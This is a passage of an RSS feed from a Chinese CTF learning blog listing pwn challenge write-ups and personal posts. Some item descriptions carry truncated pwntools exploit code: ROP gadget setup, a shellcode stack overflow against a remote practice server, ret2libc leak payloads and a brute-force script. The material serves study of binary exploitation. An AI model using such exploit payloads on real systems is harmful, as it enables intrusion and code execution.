fake_debugger beta 没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了 #!/usr/bin/env python # coding=utf-8 from pwn import * #context(log_level = &amp;#39;debug&amp;#39;) total_char = &amp;#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.&amp;gt;,&amp;lt;:;\&amp;#34;\&amp;#39;\\`~!@#$%^&amp;amp;*(){}[]&amp;#39; def test(flag_now): sh = remote(&amp;#34;101.132.177.131&amp;#34;,9999) payload = flag_now sh.sendlineafter(&amp;#34;now!\n&amp;#34;,payload) for i in range(2 * len(flag_now)): sh.sendlineafter(&amp;#34;---\n&amp;#34;,&amp;#39; &amp;#39;)</description></item><item><title>HGAME2021-WEEK2-PWN-WP</title><link>https://chujdk.github.io/wp/1079.html</link><pubDate>Tue, 09 Feb 2021 19:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1079.html</guid><description>rop_primary 没什么难度，就是单纯的 ROP #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * import re elf = ELF(&amp;#34;./rop_primary&amp;#34;) pop_rdi_ret = 0x401613 pop_rsi_r15_ret = 0x401611 pop_r14_r15_ret = 0x401610 def matrixMul(A, B): if len(A[0]) == len(B): res = [[0] * len(B[0]) for i in range(len(A))] for i in range(len(A)): for j in range(len(B[0])): for k in range(len(B)): res[i][j] += int(A[i][k])</description></item><item><title>关于/proc目录</title><link>https://chujdk.github.io/pwnreview/1070.html</link><pubDate>Tue, 09 Feb 2021 15:29:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1070.html</guid><description>/proc 这个目录很牛，充满了信息 /proc 应该说是 Linux 一切皆文件的设计哲学的体现，其中的文件和目录本身都是虚拟的一个文件系统，提供理一些内核信息。里面的有些</description></item><item><title>HGAME2021-WEAK1-WP</title><link>https://chujdk.github.io/wp/1044.html</link><pubDate>Sun, 07 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1044.html</guid><description>许久没有更新博客了，主要是因为最近都在打 hgame，客观来讲题挺难的，别的方向的题没做过，就真的是都不会。这篇博客是 week1 中我解出来的题目的 wp 的</description></item><item><title>BUU-starctf_2019_quicksort-WP</title><link>https://chujdk.github.io/wp/1040.html</link><pubDate>Fri, 29 Jan 2021 22:43:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1040.html</guid><description>不知不觉就在factorio中颓了一天，`所以就做了这么一道不能算难的题目。 这里s可以把ptr溢出掉实现任意地址写。注意gets是读到'\n</description></item><item><title>xctf-EasyPwn-WP</title><link>https://chujdk.github.io/wp/1037.html</link><pubDate>Thu, 28 Jan 2021 10:34:49 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1037.html</guid><description>很久没做xctf的题了，这道题其实不难，但是漏洞点不容易看出来（菜如我就没看出来） 这里的v2其实是有溢出的，v2的大小仅有0x3EB，s的大</description></item><item><title>BUU-SWPUCTF_2019_login-WP</title><link>https://chujdk.github.io/wp/1035.html</link><pubDate>Wed, 27 Jan 2021 17:42:23 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1035.html</guid><description>本来想改返回地址的，但是发现不论是one_gadget还是system都出现了dump core，据说是32位程序这样改返回地址很容易爆，我也</description></item><item><title>BUU-wustctf2020_easyfast-WP</title><link>https://chujdk.github.io/wp/1034.html</link><pubDate>Wed, 27 Jan 2021 13:07:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1034.html</guid><description>fastbin attack水题，大概是House Of Spirit 存在UAF,所以也不需要double free了，申请两个chunk，free掉他们，由于fastbi</description></item><item><title>BUU-gyctf_2020_force-WP</title><link>https://chujdk.github.io/wp/1033.html</link><pubDate>Wed, 27 Jan 2021 10:05:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1033.html</guid><description>报以复习的形态做了一下这道HOF裸题，结果还是学到了新知识，蛮好蛮好 HOF不想多说了，毕竟是挺简单的一种利用，此题中有谈及。 leak 每一个chun</description></item><item><title>BUU-wdb_2018_3rd_soEasy-WP</title><link>https://chujdk.github.io/wp/1029.html</link><pubDate>Tue, 26 Jan 2021 13:08:01 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1029.html</guid><description>名字都取成这样了，也不想说什么了 #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = &amp;#39;debug&amp;#39;,arch = &amp;#39;i386&amp;#39;,os = &amp;#39;linux&amp;#39;) #sh = process(&amp;#34;./wdb_2018_3rd_soEasy&amp;#34;) sh = remote(&amp;#34;node3.buuoj.cn&amp;#34;,29310) sh.recvuntil(&amp;#34;-&amp;gt;&amp;#34;) addr = int(sh.recvuntil(&amp;#34;\n&amp;#34;),base = 16) payload = asm(shellcraft.sh()) sh.sendlineafter(&amp;#34;do?\n&amp;#34;,payload.ljust(0x48 + 4,&amp;#39;a&amp;#39;) + p32(addr)) sh.interactive()</description></item><item><title>BUU-[BJDCTF 2nd]rci-WP</title><link>https://chujdk.github.io/wp/1028.html</link><pubDate>Mon, 25 Jan 2021 20:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1028.html</guid><description>头图变成上篇文章的了，不知道为什么 Linux操作题，也不需要写什么脚本 程序很容易看，流程就是有一次ls的机会，第二次需要输入当前的目录，然后</description></item><item><title>BUU-picoctf_2018_leak_me-WP</title><link>https://chujdk.github.io/wp/1023.html</link><pubDate>Sun, 24 Jan 2021 21:48:28 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1023.html</guid><description>这道题没什么难度，IDA没办法反编译，没办法，就硬看呗 有这个后门,需要我们输入一个正确的密码才可以执行，密码会先被读到内存中。 而我们会输入自</description></item><item><title>BUU-[极客大挑战 2019]Not Bad-WP</title><link>https://chujdk.github.io/wp/1019.html</link><pubDate>Sun, 24 Jan 2021 16:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1019.html</guid><description>这题其实挺简单的，但是我还是没做出来:( 新的观点 原来在对于没开NX的题目可以考虑用jmp rsp的gadget啊！学到了。题目中有这个gadg</description></item><item><title>BUU-bcloud_bctf_2016-WP</title><link>https://chujdk.github.io/wp/1018.html</link><pubDate>Sat, 23 Jan 2021 18:34:46 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1018.html</guid><description>发牢骚 考试周是真的烦，快一个星期没有碰pwn，做本题时的体验很差 知识点 本题是House Of系列中的House Of Force，也是我第一次接触H</description></item><item><title>ptmalloc的深入分析</title><link>https://chujdk.github.io/pwnreview/1013.html</link><pubDate>Fri, 22 Jan 2021 23:43:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1013.html</guid><description>好吧，这篇文章应该是不会发布的。 看这个东西主要的目的是为了获得一个对堆的理性认知，从知其然到知其所以然。当然由于本人才学疏浅，肯定会有许多纰</description></item><item><title>BUU-inndy_echo3-WP</title><link>https://chujdk.github.io/wp/1012.html</link><pubDate>Sat, 16 Jan 2021 15:01:03 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1012.html</guid><description>虽然马上就要期末考了，我应该好好复习数分，但是还是没忍住，花了不少时间pwn了这题。 这是我做过的最麻烦的fmt，知识并没有新增，还是“搭跳板</description></item><item><title>第一个一百！！！</title><link>https://chujdk.github.io/mess/1006.html</link><pubDate>Fri, 15 Jan 2021 18:57:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1006.html</guid><description>看着九十九这个数字想了一会儿，惊觉博客居然要有一百篇文章了，既然如此这第一百篇就胡扯一气吧。 缘起 高考失利，不过最后进入的学校和专业还是相对满</description></item><item><title>BUU-metasequoia_2020_blacksmith-WP</title><link>https://chujdk.github.io/wp/1005.html</link><pubDate>Thu, 14 Jan 2021 19:09:51 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1005.html</guid><description>整数溢出，size_t是一个不小压力机器字长的无符号整型，然鹅判断长度的时候 这里用的是signed int，所以我们输入一个负数就可以轻松栈溢</description></item><item><title>BUU-picoctf_2018_buffer overflow 0-WP</title><link>https://chujdk.github.io/wp/1001.html</link><pubDate>Tue, 12 Jan 2021 14:39:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1001.html</guid><description>今天好像都是水题嘛。不过这题使用ssh连接直接给了一个没root权限的shell 不过有一个vuln，就是题目给出的elf。 payload很好</description></item><item><title>BUU-cmcc_pwnme1-WP</title><link>https://chujdk.github.io/wp/999.html</link><pubDate>Tue, 12 Jan 2021 11:11:07 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/999.html</guid><description>完成任务很开心。栈溢出水题，没什么可说的，直接exp吧 #!/usr/bin/env python # coding=utf-8 from pwn import * sh = remote(&amp;#34;node3.buuoj.cn&amp;#34;,29136) elf = ELF(&amp;#34;./pwnme1&amp;#34;) libc = ELF(&amp;#34;./libcs/buu-32-libc.so&amp;#34;) pop_ebp_ret = 0x80485f3 payload = &amp;#39;a&amp;#39; * 0xA4 + &amp;#39;b&amp;#39; * 0x4 + p32(elf.symbols[&amp;#34;puts&amp;#34;]) + p32(pop_ebp_ret) + p32(elf.got[&amp;#34;puts&amp;#34;]) payload += p32(0x8048570) sh.sendlineafter(&amp;#34;Exit \n&amp;#34;,&amp;#39;5&amp;#39;) sh.sendlineafter(&amp;#34;fruit:&amp;#34;,payload) sh.recvuntil(&amp;#34;..\n&amp;#34;) puts_addr</description></item><item><title>BUU-inndy_onepunch-WP</title><link>https://chujdk.github.io/wp/997.html</link><pubDate>Mon, 11 Jan 2021 15:53:35 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/997.html</guid><description>哈哈这道题其实没什么可说的，一看只有一次修改一个字节的机会，自然没什么思路 但是此题代码段可修改，所以我们修改一个jmp short指令就可以让</description></item><item><title>BUU-starctf_2019_babyshell-WP</title><link>https://chujdk.github.io/wp/994.html</link><pubDate>Sat, 09 Jan 2021 20:09:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/994.html</guid><description>这道题目很有意思，我很喜欢 分析 流程很简单 这里读入一段，然后 进入这样一个判断，做的事就是对我们输入的串中的每个字母在 这个字符串里找匹配，如果每</description></item><item><title>BUU-starctf2018_babystack-WP</title><link>https://chujdk.github.io/wp/985.html</link><pubDate>Sat, 09 Jan 2021 16:24:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/985.html</guid><description>这道题是碰到知识盲区了 写在前面 这篇wp还不完善，之后再慢慢补全 漏洞点 非常明显的一个栈溢出，而且可以溢出非常多。当然，由于开了canary，我</description></item><item><title>很开心的一件事</title><link>https://chujdk.github.io/mess/981.html</link><pubDate>Sat, 09 Jan 2021 13:21:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/981.html</guid><description>最近其实是有点难受的，感觉题目都太难了，先是没思路，看了wp还复现不出来。不过让我很开心的一件事是一篇发在看雪的wp被评为了优秀 说实话这道题</description></item><item><title>KCTF-前世今生（PWN）/ASIS CTF Finals 2016 Heapstorm-WP</title><link>https://chujdk.github.io/wp/979.html</link><pubDate>Thu, 07 Jan 2021 18:14:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/979.html</guid><description>最近为了学习_IO_FILE这一类的利用，在尝试阅读scanf的源码，想找一点参考资料，就到看雪论坛上面看了看，资料没找到反而是发现看雪也有</description></item><item><title>从源码看glibc中scanf的实现</title><link>https://chujdk.github.io/pwnreview/963.html</link><pubDate>Wed, 06 Jan 2021 15:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/963.html</guid><description>关于 这是可能会成为一个新的专栏，主要想学习一下glibc对IO这一方面的实现，顺便记录一下。有这个打算的主要原因是最近做题做的心态有些小崩，</description></item><item><title>BUU-pwnable_simple_login/XCTF-formate2-WP</title><link>https://chujdk.github.io/wp/970.html</link><pubDate>Wed, 06 Jan 2021 15:27:19 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/970.html</guid><description>很简单的一个栈溢出，本来还以为真的是什么高级密码学 这里有一个栈溢出。虽然只溢出了四个字节，但是由于input在bss段，其地址已知，我们可以</description></item><item><title>BUU-warmup(PWN)-WP</title><link>https://chujdk.github.io/wp/964.html</link><pubDate>Wed, 06 Jan 2021 14:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/964.html</guid><description>这道题做的特别难受，也浪费了很多时间，确实是状态太差了。最近有一点小失意，发现好像什么题都不会做了。 这道题就是一个简单的ret2syscal</description></item><item><title>BUU-picoctf_2018_echooo-WP</title><link>https://chujdk.github.io/wp/966.html</link><pubDate>Tue, 05 Jan 2021 23:37:42 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/966.html</guid><description>其实这题之前还做了一道，但是有点晚了，而且做这俩题浪费了很多时间，有点不高兴，那个的wp就明天再说吧 没什么可说的,偏移是8，nc上去%8$s</description></item><item><title>XCTF-250-WP</title><link>https://chujdk.github.io/wp/960.html</link><pubDate>Mon, 04 Jan 2021 23:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/960.html</guid><description>这个 print，不仔细看怎么看的出来！（这个v4我愚蠢地以为是识别错误）浪费我半个小时想到底怎么用fmt利用！更可气的是xctf上还没什么人</description></item><item><title>XCTF-echo_back2-WP</title><link>https://chujdk.github.io/wp/952.html</link><pubDate>Mon, 04 Jan 2021 13:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/952.html</guid><description>写在前面 由于我本地的环境和服务器完全不一样，所以这道题其实我完全没法做，看着wp云pwn了一下也算是学了一下scanf的部分实现了。 可见在本</description></item><item><title>XCTF-Aul-WP</title><link>https://chujdk.github.io/wp/938.html</link><pubDate>Sat, 02 Jan 2021 22:31:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/938.html</guid><description>蛮好玩的一道题 一看附件暂无，抱着怀疑的心态nc了一下 进行了三次尝试后终于有光了，输入help试一下 发现输出了一堆奇怪的东西，说实话我就看懂了</description></item><item><title>XCTF/BUU/pwnable-dubblesort-WP</title><link>https://chujdk.github.io/wp/919.html</link><pubDate>Sat, 02 Jan 2021 14:35:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/919.html</guid><description>灵感 故事是这样的，拿到题目放到ida里分析，发现是个冒泡，同时数组可以随便越界，又给了libc，感觉挺熟悉的，应该可切，然后到虚拟机里che</description></item><item><title>Typecho和SEO的一些琐事（sitemap）</title><link>https://chujdk.github.io/mess/906.html</link><pubDate>Fri, 01 Jan 2021 21:31:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/906.html</guid><description/></item><item><title>XCTF-1000levevls-WP</title><link>https://chujdk.github.io/wp/903.html</link><pubDate>Fri, 01 Jan 2021 18:29:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/903.html</guid><description>一些废话 这道题目有一种更具普遍性的解法（xctf提供）即部分leak system然后爆破，但是这样的几率非常低（大约万分之一），大体是通过修</description></item><item><title>XCTF/BUU-babyfengshui-WP</title><link>https://chujdk.github.io/wp/895.html</link><pubDate>Fri, 01 Jan 2021 12:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/895.html</guid><description>XCTF总是给出一个错误的libc，让我对无法get shell百思不得其解，真是不友好，以后统一用LibcSearcher解决libc的问题</description></item><item><title>从wordpress迁移到typecho</title><link>https://chujdk.github.io/mess/888.html</link><pubDate>Thu, 31 Dec 2020 10:30:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/888.html</guid><description>以前一直用的是wordpress，主题是atom，一款很优秀的主题，但是其设置我一直搞不太懂（毕竟是免费主题，作者愿意开源出来就很感激了），</description></item><item><title>XCTF-HMI流水灯运行-WP</title><link>https://chujdk.github.io/wp/xctf-hmi%E6%B5%81%E6%B0%B4%E7%81%AF%E8%BF%90%E8%A1%8C-wp.html</link><pubDate>Wed, 30 Dec 2020 16:18:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-hmi%E6%B5%81%E6%B0%B4%E7%81%AF%E8%BF%90%E8%A1%8C-wp.html</guid><description>这道题目挺有点意思，也让我知道了工控安全在ctf是怎么体现的。 其实很简单 就是这样的一个栈溢出而已，几乎没有保护，我们可以为所欲为。但是需要特</description></item><item><title>BUU-qctf_2018_stack2-WP</title><link>https://chujdk.github.io/wp/buu-qctf_2018_stack2-wp.html</link><pubDate>Tue, 29 Dec 2020 15:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-qctf_2018_stack2-wp.html</guid><description>这道题是很明显的数组越界的漏洞，题目也给出了后门"hackhere"。于是自然的我考虑通过越界覆写return address实现ret2te</description></item><item><title>XCTF-easyfmt-WP</title><link>https://chujdk.github.io/wp/xctf-easyfmt-wp.html</link><pubDate>Tue, 29 Dec 2020 11:46:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-easyfmt-wp.html</guid><description>easy是easy，但是特别麻烦。 简单的四步。 checkin没什么好办法，老老实实爆破，概率0.2，'0'-'4'都有可能 修改exit的go</description></item><item><title>BUU-actf_2019_babystack-WP</title><link>https://chujdk.github.io/wp/buu-actf_2019_babystack-wp.html</link><pubDate>Tue, 29 Dec 2020 10:18:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-actf_2019_babystack-wp.html</guid><description>一道简单的通过leave栈迁移实现更长的rop链的题 #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * pop_rdi_ret = 0x400ad3 context(log_level = 'debug') sh = remote("node3.buuoj.cn","28568") #sh = process("./ACTF_2019_babystack") elf = ELF("./ACTF_2019_babystack") libc = ELF("./buu-libc-2.23.so") sh.sendlineafter("e?\n>",str(0xE0)) sh.recvuntil("at ") stackaddr = int(sh.recvuntil("\n",drop = True),base = 16) payload = 'fillfill' +</description></item><item><title>两个模型</title><link>https://chujdk.github.io/mess/%E4%B8%A4%E4%B8%AA%E6%A8%A1%E5%9E%8B.html</link><pubDate>Mon, 28 Dec 2020 18:16:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/%E4%B8%A4%E4%B8%AA%E6%A8%A1%E5%9E%8B.html</guid><description>博客基本上都是记录pwn的学习，这样不是很好，想想还是记录记录生活，最近这两天做了两个挺有意思的模型 不知道是什么的飞艇 X翼 可以说是浪费了时间</description></item><item><title>BUU-actf_2019_babyheap-WP</title><link>https://chujdk.github.io/wp/buu-actf_2019_babyheap-wp.html</link><pubDate>Mon, 28 Dec 2020 17:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-actf_2019_babyheap-wp.html</guid><description>此题和BUU&amp;XCTF-hitcontraining_uaf-WP很像，都是UAF，漏洞的原因也很像，漏洞点是 #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') #sh = process('./ACTF_2019_babyheap') sh</description></item><item><title>XCTF-4-reehy-main-100-WP</title><link>https://chujdk.github.io/wp/xctf-4-reehy-main-100-wp.html</link><pubDate>Sun, 27 Dec 2020 21:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-4-reehy-main-100-wp.html</guid><description>这道题好难的感觉，看了别人的WP做了一天虽然是迷迷糊糊的拿到了flag但是还是有一点不能理解（2021.1.3更新：由于libc的问题被解决</description></item><item><title>XCTF-Recho-WP</title><link>https://chujdk.github.io/wp/xctf-recho-wp.html</link><pubDate>Sat, 26 Dec 2020 13:48:02 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-recho-wp.html</guid><description>这道题目本身挺有意思的，但是让我感到如鲠在喉，因为莫名其妙的拿不到flag。更加莫名奇妙的是吃了个饭回来就可以拿flag了，想想唯一的区别是</description></item><item><title>XCTF-supermarket-WP</title><link>https://chujdk.github.io/wp/xctf-supermarket-wp.html</link><pubDate>Fri, 25 Dec 2020 23:11:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-supermarket-wp.html</guid><description>写在前面：这篇WP很简陋，我只写了重点 堆的利用我也开始一步步的开始“上道”了，这是一道比较简单的堆溢出，主要的难点是程序比较复杂，分析比较麻</description></item><item><title>BUU-zctf_2016_note3-WP</title><link>https://chujdk.github.io/wp/buu-zctf_2016_note3-wp.html</link><pubDate>Thu, 24 Dec 2020 19:04:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-zctf_2016_note3-wp.html</guid><description>这道题几乎就是zctf2016_note2和hitcon2014_stkof的结合体，wiki上的解法好复杂的感觉，不是我这种菜鸡能够理解的</description></item><item><title>BUU-zctf2016_note2-WP</title><link>https://chujdk.github.io/wp/buu-zctf2016_note2-wp.html</link><pubDate>Thu, 24 Dec 2020 10:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-zctf2016_note2-wp.html</guid><description>这大概是某省的一道年代久远的赛题，也是unlink，和这道hitcon2014_stkof相比，区别大致如下： 多了一个可用的输出函数，可以帮</description></item><item><title>BUU-hitcon2014_stkof-WP</title><link>https://chujdk.github.io/wp/buu-hitcon2014_stkof-wp.html</link><pubDate>Wed, 23 Dec 2020 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-hitcon2014_stkof-wp.html</guid><description>这是一道堆上unlink的题，客观的来讲，堆我还是屁都不会，花了两天时间终于是理解了这道题目，感觉学CTF的过程体验很不好，每次看题解冥思苦</description></item><item><title>C++高精度实数运算类</title><link>https://chujdk.github.io/mess/c%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%AE%9E%E6%95%B0%E8%BF%90%E7%AE%97%E7%B1%BB.html</link><pubDate>Sat, 19 Dec 2020 17:19:21 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/c%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%AE%9E%E6%95%B0%E8%BF%90%E7%AE%97%E7%B1%BB.html</guid><description>你好博客，很久没见了，这个类写了我一个星期，着实是太久不写代码手生了。类也没啥可说的，类存在GitHub上。就酱。</description></item><item><title>BUU-0ctf2017_easiestprintf-WP</title><link>https://chujdk.github.io/wp/buu-0ctf2017_easiestprintf-wp.html</link><pubDate>Fri, 11 Dec 2020 22:35:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-0ctf2017_easiestprintf-wp.html</guid><description>明天就考四级了，前几天也是事情一大堆，还有个2077，昨天甚至没有写题，考虑到我岌岌可危的绩点，我现在准备放慢pwn学习的节奏了，之前花的时</description></item><item><title>BUU-xman夏令营选排位赛_2018_main-WP</title><link>https://chujdk.github.io/wp/buu-xman%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8E%92%E4%BD%8D%E8%B5%9B_2018_main-wp.html</link><pubDate>Wed, 09 Dec 2020 20:05:47 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-xman%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8E%92%E4%BD%8D%E8%B5%9B_2018_main-wp.html</guid><description>这道题目挺有意思的，我首次通过leave指令实现了成功的栈迁移，因为leave和 mov rsp,rbp pop rbp 是等价的，这道题目栈上可以输入的长度只有32字节，偏</description></item><item><title>BUU-mrctf2020_spfa-WP</title><link>https://chujdk.github.io/wp/buu-mrctf2020_spfa-wp.html</link><pubDate>Wed, 09 Dec 2020 16:24:17 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-mrctf2020_spfa-wp.html</guid><description>spfa真的是在哪里都被黑啊.. 这里我们可以实现对qu[1000]的一次修改，而对qu[1000]的访问是典型的栅栏错误，实际上修改的是 这个</description></item><item><title>BUU-hitcontraining_playfmt-WP</title><link>https://chujdk.github.io/wp/buu-hitcontraining_playfmt-wp.html</link><pubDate>Tue, 08 Dec 2020 19:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-hitcontraining_playfmt-wp.html</guid><description>在看这篇WP前，如果你不了解堆上的格式化字符串的利用方法，建议你先看一下这一篇WP。 这道题和xman_2019_format这题基本没什么差</description></item><item><title>BUU-xman_2019_format-WP</title><link>https://chujdk.github.io/wp/buu-xman_2019_format-wp.html</link><pubDate>Tue, 08 Dec 2020 14:08:15 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-xman_2019_format-wp.html</guid><description>这是一道堆上的格式化字符串漏洞，做完这道题我大概可以理解“跳板”是什么鬼了，也对%n的原理有了正确的认知，之后计划完成类似的echo3和pl</description></item><item><title>XCTF-note-service2-WP</title><link>https://chujdk.github.io/wp/xctf-note-service2-wp.html</link><pubDate>Mon, 07 Dec 2020 15:33:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-note-service2-wp.html</guid><description>这道题是一个在堆上的shellcode，也是第一次接触。也让我明白了还是要先checksec一下，刚开始做到时候没有检查不知道NX关了，一直</description></item><item><title>XCTF-secret_file-WP</title><link>https://chujdk.github.io/wp/xctf-secret_file-wp.html</link><pubDate>Sun, 06 Dec 2020 22:45:43 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-secret_file-wp.html</guid><description>这道题目我觉得应该算是逆向的题目，其实是一个简单的栈溢出，但是程序的逻辑不是很好懂，所以我也没有自己做出来，还是有些遗憾的。 第一个框中的ge</description></item><item><title>XCTF-time_formatter-WP</title><link>https://chujdk.github.io/wp/xctf-time_formatter-wp.html</link><pubDate>Sat, 05 Dec 2020 13:52:05 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/xctf-time_formatter-wp.html</guid><description>这道题很久之前就做到了，苦于是堆题一直没做，学了UAF之后再来做总算是PWN了，遗憾的是仍然是看了别人的WP之后才做出来的。 其实是非常简单的</description></item><item><title>BUU&amp;amp;XCTF-hitcontraining_uaf-WP</title><link>https://chujdk.github.io/wp/buuxctf-hitcontraining_uaf-wp.html</link><pubDate>Fri, 04 Dec 2020 20:23:43 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buuxctf-hitcontraining_uaf-wp.html</guid><description>这是我做的第一道堆题，总体来讲还是学到了点知识，事实证明堆管理还是要结合题目来学，光看确实是难以学会。 这道题在BUU和XCTF上面都有，有一</description></item><item><title>BUU-强网杯2019 拟态 STKOF-WP</title><link>https://chujdk.github.io/wp/buu-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81-stkof-wp.html</link><pubDate>Wed, 02 Dec 2020 19:28:26 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81-stkof-wp.html</guid><description>拟态的题目这是第一道，也是第一次听说。所以看到两个二进制文件的时候就迷惑了。我完全就是看着别人的wp学习了一下。不过这道题还是很有意思的。 拟</description></item><item><title>BUU-gwctf_2019_jiandan_pwn1-WP</title><link>https://chujdk.github.io/wp/buu-gwctf_2019_jiandan_pwn1-wp.html</link><pubDate>Tue, 01 Dec 2020 11:11:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-gwctf_2019_jiandan_pwn1-wp.html</guid><description>这道题目确实是比较简单的一道题，仅仅是要在输入的时候注意一下就可以了。 这里相当于是自己实现了一个gets，但是记录当前长度的变量也存在当前栈</description></item><item><title>BUU-wustctf2020_babyfmt-WP</title><link>https://chujdk.github.io/wp/buu-wustctf2020_babyfmt-wp.html</link><pubDate>Mon, 30 Nov 2020 16:40:38 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/buu-wustctf2020_babyfmt-wp.html</guid><description>这是一道格式化字符串的题目，绕的弯子有点多，我觉得是一道不错的题目。 保护全开。 程序本身来看，是很典型的让我们pwn的题。 leak函数做到了泄</description></item><item><title>11月回顾</title><link>https://chujdk.github.io/pwnreview/11%E6%9C%88%E5%9B%9E%E9%A1%BE.html</link><pubDate>Sun, 29 Nov 2020 15:42:00 +0000</pubDate><author>chujj31@gmail.com 